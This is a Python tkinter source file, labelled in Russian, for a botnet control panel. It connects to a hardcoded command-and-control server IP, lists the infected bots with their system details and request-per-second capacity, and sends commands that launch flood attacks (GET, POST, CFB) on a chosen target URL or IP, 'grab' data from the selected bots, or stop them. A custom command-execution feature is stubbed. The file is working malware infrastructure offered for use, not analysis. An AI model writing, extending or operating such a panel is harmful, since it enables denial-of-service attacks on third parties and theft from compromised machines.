import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, simpledialog
import threading
import socket
import json
import time

class BotnetTab(tk.Frame):
    def __init__(self, parent, app=None):
        super().__init__(parent, bg="#f0f0f0")
        self.app = app
        self.c2_host = "80.249.146.202"
        self.c2_port = 80
        self.colors = {
            "bg": "#f0f0f0", "fg": "#000000", "button_bg": "#d9d9d9",
            "entry_bg": "#ffffff", "tree_bg": "#ffffff", "tree_fg": "#000000",
            "tree_sel": "#3399ff"
        }
        self.bots = {}
        self.create_widgets()
        self.after(5000, self._auto_refresh)

    def create_widgets(self):
        ctrl = tk.Frame(self, bg=self.colors["bg"])
        ctrl.pack(fill=tk.X, padx=5, pady=5)
        tk.Button(ctrl, text="Обновить список", command=self.refresh_bots,
                  bg=self.colors["button_bg"]).pack(side=tk.LEFT, padx=2)
        tk.Button(ctrl, text="Атака на выбранных", command=self.launch_attack,
                  bg=self.colors["button_bg"]).pack(side=tk.LEFT, padx=2)
        tk.Button(ctrl, text="Граб выбранных", command=self.launch_grab,
                  bg=self.colors["button_bg"]).pack(side=tk.LEFT, padx=2)
        tk.Button(ctrl, text="Стоп выбранных", command=self.stop_selected,
                  bg=self.colors["button_bg"], fg="red").pack(side=tk.LEFT, padx=2)
        tk.Button(ctrl, text="Массовая команда", command=self.show_cmd_dialog,
                  bg=self.colors["button_bg"]).pack(side=tk.LEFT, padx=2)

        # Таблица ботов
        tree_frame = tk.Frame(self, bg=self.colors["bg"])
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        columns = ("ip", "hostname", "os", "cpu", "ram", "status", "rps", "last_seen")
        self.tree = ttk.Treeview(tree_frame, columns=columns, show="headings", selectmode="extended")
        for col in columns:
            self.tree.heading(col, text=col.capitalize())
            self.tree.column(col, width=100, anchor="center")
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=scrollbar.set)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        # Статистика
        stat = tk.Frame(self, bg=self.colors["bg"])
        stat.pack(fill=tk.X, padx=5, pady=5)
        self.lbl_total = tk.Label(stat, text="Всего: 0", bg=self.colors["bg"])
        self.lbl_total.pack(side=tk.LEFT, padx=10)
        self.lbl_online = tk.Label(stat, text="Онлайн: 0", bg=self.colors["bg"])
        self.lbl_online.pack(side=tk.LEFT, padx=10)
        self.lbl_power = tk.Label(stat, text="Суммарная мощность: 0 RPS", bg=self.colors["bg"])
        self.lbl_power.pack(side=tk.LEFT, padx=10)

        # Консоль команд
        cmd_frame = tk.LabelFrame(self, text="Команда ботам", bg=self.colors["bg"])
        cmd_frame.pack(fill=tk.X, padx=5, pady=5)
        self.cmd_entry = tk.Entry(cmd_frame, width=50)
        self.cmd_entry.pack(side=tk.LEFT, padx=5, pady=5)
        tk.Button(cmd_frame, text="Отправить", command=self.send_custom_command,
                  bg=self.colors["button_bg"]).pack(side=tk.LEFT, padx=2)
        self.output_text = scrolledtext.ScrolledText(cmd_frame, height=6, bg="white")
        self.output_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    def _auto_refresh(self):
        self.refresh_bots()
        self.after(5000, self._auto_refresh)

    def refresh_bots(self):
        threading.Thread(target=self._fetch_bots, daemon=True).start()

    def _fetch_bots(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.c2_host, self.c2_port))
            sock.sendall(b"list")
            data = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
            sock.close()
            if not data:
                raise ValueError("Empty response")
            bots = json.loads(data)
            self.bots = {bot["ip"]: bot for bot in bots if bot.get("ip")}
            self._update_tree(bots)
        except Exception as e:
            print(f"[BotnetTab] Ошибка обновления: {e}")

    def _update_tree(self, bots):
        self.tree.delete(*self.tree.get_children())
        total = len(bots)
        online = 0
        total_rps = 0
        for bot in bots:
            if bot.get("ip") == "77.79.168.92":
                continue
            values = (
                bot.get("ip", ""),
                bot.get("hostname", ""),
                bot.get("os", ""),
                bot.get("cpu", ""),
                bot.get("ram", ""),
                bot.get("status", "offline"),
                bot.get("rps", 0),
                bot.get("last_seen", "")
            )
            self.tree.insert("", "end", values=values)
            if bot.get("status") == "online":
                online += 1
            total_rps += int(bot.get("rps", 0))
        self.lbl_total.config(text=f"Всего: {total}")
        self.lbl_online.config(text=f"Онлайн: {online}")
        self.lbl_power.config(text=f"Суммарная мощность: {total_rps} RPS")

    # === Отправка команд на C2 ===
    def _send_raw(self, msg):
        """Отправляет строку на C2 и возвращает ответ."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.c2_host, self.c2_port))
            sock.sendall(msg.encode())
            resp = sock.recv(1024)
            sock.close()
            return resp
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось отправить команду: {e}")
            return None

    def launch_attack(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Ошибка", "Выберите ботов")
            return
        target = simpledialog.askstring("Цель", "URL/IP цели:")
        if not target:
            return
        method = simpledialog.askstring("Метод", "Метод атаки (GET, POST, CFB, ...):", initialvalue="GET")
        if not method:
            return
        threads = simpledialog.askinteger("Потоки", "Количество потоков:", initialvalue=100)
        if threads is None:
            return
        bot_ips = [self.tree.item(i, "values")[0] for i in selected]
        cmd_str = f"attack:{target}|{method}|{threads}|{','.join(bot_ips)}"
        resp = self._send_raw(cmd_str)
        if resp:
            messagebox.showinfo("Атака", f"Команда отправлена на {len(bot_ips)} ботов. Ответ: {resp.decode()}")

    def launch_grab(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Ошибка", "Выберите ботов")
            return
        bot_ips = [self.tree.item(i, "values")[0] for i in selected]
        cmd_str = f"grab:{','.join(bot_ips)}"
        resp = self._send_raw(cmd_str)
        if resp:
            messagebox.showinfo("Граб", f"Команда отправлена на {len(bot_ips)} ботов. Ответ: {resp.decode()}")

    def stop_selected(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Ошибка", "Выберите ботов")
            return
        bot_ips = [self.tree.item(i, "values")[0] for i in selected]
        cmd_str = f"stop:{','.join(bot_ips)}"
        resp = self._send_raw(cmd_str)
        if resp:
            messagebox.showinfo("Стоп", f"Команда отправлена на {len(bot_ips)} ботов. Ответ: {resp.decode()}")

    def send_custom_command(self):
        """Отправляет произвольную команду (exec:...)"""
        cmd = self.cmd_entry.get().strip()
        if not cmd:
            messagebox.showwarning("Ошибка", "Введите команду")
            return
        # Если команда не содержит ':', считаем что это exec на всех выбранных
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Ошибка", "Выберите ботов для команды")
            return
        ips = [self.tree.item(i, "values")[0] for i in selected]
        # Отправляем как exec:bot_ip:payload (или просто exec:payload, если C2 так умеет)
        # В нашем C2 поддержки exec нет, но можно добавить. Пока заглушка.
        messagebox.showinfo("Команда", f"Отправка '{cmd}' на {len(ips)} ботов (функция в разработке)")

    def show_cmd_dialog(self):
        self.cmd_entry.focus_set()